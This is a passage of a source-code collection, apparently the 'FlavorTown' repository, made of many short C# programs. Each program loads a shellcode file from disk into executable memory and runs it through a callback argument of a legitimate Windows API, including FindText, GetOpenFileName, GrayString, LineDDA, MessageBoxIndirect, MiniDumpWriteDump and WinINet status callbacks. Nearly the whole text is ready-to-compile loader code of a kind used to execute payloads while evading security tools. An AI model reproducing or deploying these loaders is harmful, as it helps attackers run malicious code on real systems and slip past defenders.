                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr pvContext = IntPtr.Zero;
            ulong CREATE_FOR_IMPORT = 1;
            OpenEncryptedFileRaw(System.IO.Path.GetTempFileName(), CREATE_FOR_IMPORT, out pvContext);
            WriteEncryptedFileRaw(hAlloc, IntPtr.Zero, pvContext);
        }

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Advapi32.dll")]
        static extern uint OpenEncryptedFileRaw(
            string lpFilename,
            ulong ulFlags,
            out IntPtr pvContext);

        [DllImport("Advapi32.dll")]
        static extern uint WriteEncryptedFileRaw(
            IntPtr pfImportCallback,
            IntPtr pvCallbackContext,
            IntPtr pvContext);
    }
}

```

`C#/EvtSubscribe_CVEEventWrite.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EvtSubscribe_CVEEventWrite
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: EvtSubscribe_CVEEventWrite.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            uint EvtSubscribeToFutureEvents = 1;
            IntPtr hEvent = EvtSubscribe(IntPtr.Zero, IntPtr.Zero, "Application", "*[System/EventID=1]", IntPtr.Zero, IntPtr.Zero, hAlloc, EvtSubscribeToFutureEvents);
            long test = CveEventWrite("2022-123456", "Wra7h");
            System.Threading.Thread.Sleep(10000);
            EvtClose(hEvent);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Wevtapi.dll")]
        static extern IntPtr EvtSubscribe(
            IntPtr hSession,
            IntPtr SignalEvent,
            [MarshalAs(UnmanagedType.LPWStr)] string ChannelPath,
            [MarshalAs(UnmanagedType.LPWStr)] string Query,
            IntPtr Bookmark,
            IntPtr Context,
            IntPtr Callback,
            uint Flags);

        [DllImport("Advapi32.dll")]
        static extern long CveEventWrite(string CveId, string AdditionalDetails);

        [DllImport("Wevtapi.dll")]
        static extern bool EvtClose(IntPtr hEvent);
    }
}

```

`C#/FCICreate.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FCICreate
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: FCICreate.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr pErf = IntPtr.Zero;
            FCICreate(ref pErf,
                IntPtr.Zero, hAlloc,
                IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero, IntPtr.Zero,
                IntPtr.Zero);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Cabinet.dll")]
        public extern static IntPtr FCICreate(
            ref IntPtr perf,
            IntPtr pfnfcifp,
            IntPtr pfna,
            IntPtr pfnf,
            IntPtr pfnopen,
            IntPtr pfnread,
            IntPtr pfnwrite,
            IntPtr pfnclose,
            IntPtr pfnseek,
            IntPtr pfndelete,
            IntPtr pfnfcigtf,
            IntPtr pv);
    }
}

```

`C#/FindText.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FindText
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: FindText.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);


            uint FR_ENABLEHOOK = 0x100;
            FINDREPLACE sFR = new FINDREPLACE();
            sFR.lStructSize = (uint)Marshal.SizeOf(sFR);
            sFR.hwndOwner = Process.GetCurrentProcess().MainWindowHandle;
            sFR.Flags = FR_ENABLEHOOK;
            sFR.lpfnHook = hAlloc;
            sFR.lpstrFindWhat = "h7arW";
            sFR.lpstrReplaceWith = "h7arW";
            sFR.wReplaceWithLen = 1;
            sFR.wFindWhatLen = 1;

            FindText(ref sFR);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr FindText(ref FINDREPLACE lpfr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct FINDREPLACE
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint Flags;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrFindWhat;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrReplaceWith;
            public ushort wFindWhatLen;
            public ushort wReplaceWithLen;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public IntPtr lpTemplateName;
        }
    }
}

```

`C#/GetOpenFileName.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GetOpenFileName
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: GetOpenFileName.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            /* 
             * To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
             * structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
             * Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
             * See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
             */

            int OFN_ENABLEHOOK = 0x00000020;
            int OFN_EXPLORER = 0x00080000;

            OpenFileName sOpenFileName = new OpenFileName();
            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
            sOpenFileName.nMaxFile = 260;
            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
            sOpenFileName.lpfnHook = hAlloc;

            GetOpenFileName(ref sOpenFileName);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool GetOpenFileName(ref OpenFileName ofn);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OpenFileName
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public string lpstrFilter;
            public string lpstrCustomFilter;
            public int nMaxCustFilter;
            public int nFilterIndex;
            public string lpstrFile;
            public int nMaxFile;
            public string lpstrFileTitle;
            public int nMaxFileTitle;
            public string lpstrInitialDir;
            public string lpstrTitle;
            public int Flags;
            public short nFileOffset;
            public short nFileExtension;
            public string lpstrDefExt;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr pvReserved;
            public int dwReserved;
            public int flagsEx;
        }
    }
}

```

`C#/GetSaveFileName.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GetSaveFileName
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: GetSaveFileName.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            /* 
             * To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
             * structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
             * Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
             * See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
             */

            int OFN_ENABLEHOOK = 0x00000020;
            int OFN_EXPLORER = 0x00080000;

            OpenFileName sOpenFileName = new OpenFileName();
            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
            sOpenFileName.nMaxFile = 260;
            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
            sOpenFileName.lpfnHook = hAlloc;

            GetSaveFileName(ref sOpenFileName);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool GetSaveFileName(ref OpenFileName ofn);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OpenFileName
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public string lpstrFilter;
            public string lpstrCustomFilter;
            public int nMaxCustFilter;
            public int nFilterIndex;
            public string lpstrFile;
            public int nMaxFile;
            public string lpstrFileTitle;
            public int nMaxFileTitle;
            public string lpstrInitialDir;
            public string lpstrTitle;
            public int Flags;
            public short nFileOffset;
            public short nFileExtension;
            public string lpstrDefExt;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr pvReserved;
            public int dwReserved;
            public int flagsEx;
        }
    }
}

```

`C#/GrayString.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GrayString
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: GrayString.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hDC = GetDC(IntPtr.Zero);
            GrayString(hDC, IntPtr.Zero, hAlloc, hAlloc, 0, 0, 0, 0, 0);
            ReleaseDC(IntPtr.Zero, hDC);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);


        [DllImport("User32.dll")]
        public extern static IntPtr GetDC(IntPtr hWnd);

        [DllImport("User32.dll")]
        public extern static bool GrayString(
            IntPtr hDC,
            IntPtr hBrush,
            IntPtr lpOutputFunc,
            IntPtr lpData,
            int nCount,
            int x,
            int y,
            int nWidth,
            int nHeigth);

        [DllImport("User32.dll")]
        public extern static IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
    }
}

```

`C#/InternetSetStatusCallback.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace InternetSetStatusCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: InternetSetStatusCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            //Initializes use of the WinINet
            int INTERNET_OPEN_TYPE_DIRECT = 1;
            int INTERNET_FLAG_OFFLINE = 0x1000000;
            IntPtr hSession = InternetOpen(string.Empty, INTERNET_OPEN_TYPE_DIRECT, 
                string.Empty, string.Empty, INTERNET_FLAG_OFFLINE);

            //The InternetSetStatusCallback function sets up a callback function that WinINet functions can call as progress is made during an operation.
            InternetSetStatusCallback(hSession, hAlloc);

            //Opens an File Transfer Protocol (FTP) or HTTP session for a given site
            short INTERNET_DEFAULT_HTTPS_PORT = 443;
            int INTERNET_SERVICE_HTTP = 3;
            IntPtr hInternet = InternetConnect(hSession, "localhost", INTERNET_DEFAULT_HTTPS_PORT, 
                string.Empty, string.Empty, INTERNET_SERVICE_HTTP, 0, (IntPtr)1);

            //Cleanup
            InternetCloseHandle(hSession);
            InternetCloseHandle(hInternet);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr InternetOpen(
           string lpszAgent, int dwAccessType, string lpszProxyName,
           string lpszProxyBypass, int dwFlags);

        [DllImport("Wininet.dll")]
        static extern IntPtr InternetSetStatusCallback(
            IntPtr hInternet,
            IntPtr lpfnInternetCallback);

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr InternetConnect(
           IntPtr hInternet, string lpszServerName, short nServerPort,
           string lpszUsername, string lpszPassword, int dwService,
           int dwFlags, IntPtr dwContext);

        [DllImport("wininet.dll", SetLastError = true)]
        static extern bool InternetCloseHandle(IntPtr hInternet);

    }
}

```

`C#/LineDDA.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace LineDDA
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: LineDDA.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            LineDDA(0, 0, 1, 1, hAlloc, IntPtr.Zero);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Gdi32.dll")]
        public extern static bool LineDDA(int xStart, int yStart,
            int xEnd, int yEnd, IntPtr lpProc, IntPtr data);
    }
}

```

`C#/MFAddPeriodicCallback.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MFAddPeriodicCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: MFAddPeriodicCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            MFStartup(0x0002 << 16 | 0x0070, 0x1);

            uint dwKey = 0;
            MFAddPeriodicCallback(hAlloc, IntPtr.Zero, out dwKey);

            System.Threading.Thread.Sleep(1000);

            MFShutdown();

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern uint MFStartup(
        ulong Version,
        uint dwFlags);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern uint MFAddPeriodicCallback(
            IntPtr Callback,
            IntPtr pContext,
            out uint dwKey);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern IntPtr MFShutdown();

    }
}

```

`C#/MessageBoxIndirect.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MessageBoxIndirect
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: MessageBoxIndirect.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            MSGBOXPARAMS sMsgBoxParams = new MSGBOXPARAMS();
            sMsgBoxParams.dwStyle = (uint)(0x00004000L); // Should have an ok button and a help button
            sMsgBoxParams.lpfnMsgBoxCallback = hAlloc; 
            sMsgBoxParams.lpszText = "Click help for shellcode!";
            sMsgBoxParams.cbSize = (uint)Marshal.SizeOf(sMsgBoxParams);

            MessageBoxIndirect(sMsgBoxParams);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int MessageBoxIndirect(MSGBOXPARAMS lbmp);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct MSGBOXPARAMS
        {
            public uint cbSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            [MarshalAs(UnmanagedType.LPWStr)] public string lpszText;
            [MarshalAs(UnmanagedType.LPWStr)] public string lpszCaption;
            public uint dwStyle;
            public IntPtr lpszIcon;
            public IntPtr dwContextHelpId;
            public IntPtr lpfnMsgBoxCallback;
            public uint dwLanguageId;
        }
    }
}
```

`C#/MiniDumpWriteDump.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MiniDumpWriteDump
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: MiniDumpWriteDump.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length,
                0x20/*RX*/, out oldProtect);

            //Dump Type
            int MiniDumpNormal = 0;
            
            MiniDumpWriteDump(
                Process.GetCurrentProcess().Handle,
                Process.GetCurrentProcess().Id, 
                IntPtr.Zero, MiniDumpNormal,
                IntPtr.Zero, IntPtr.Zero, ref hAlloc);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess, int ProcessId,
            IntPtr hFile, int DumpType,
            IntPtr ExceptionParam, IntPtr UserStreamParam,
            ref IntPtr CallbackParam);
    }
}

```

`C#/NotifyIpInterfaceChange.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NotifyIpInterfaceChange
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: NotifyIpInterfaceChange.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            uint AF_UNSPEC = 0x0;
            IntPtr hNotification = IntPtr.Zero;
            NotifyIpInterfaceChange(AF_UNSPEC, hAlloc, IntPtr.Zero, true, ref hNotification);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyIpInterfaceChange(
             uint Family,
             IntPtr Callback,
             IntPtr CallerContext,
             bool InitialNotification,
             ref IntPtr NotificationHandle);

    }
}

```

`C#/NotifyNetworkConnectivityHintChange.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NotifyNetworkConnectivityHintChange
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: NotifyNetworkConnectivityHintChange.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hNotification = IntPtr.Zero;
            NotifyNetworkConnectivityHintChange(hAlloc, IntPtr.Zero, true, out hNotification);

            System.Threading.Thread.Sleep(120 * 1000); //2 Min
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyNetworkConnectivityHintChange(IntPtr Callback,
            IntPtr CallerContext, bool InitialNotification,
            out IntPtr NotificationHandle);
    }
}

```

`C#/NotifyRouteChange2.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NotifyRouteChange2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: NotifyRouteChange2.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc,
                payload.Length, 0x20/*RX*/, out oldProtect);

            uint AF_INET = 0x2;
            IntPtr hNotification = IntPtr.Zero;
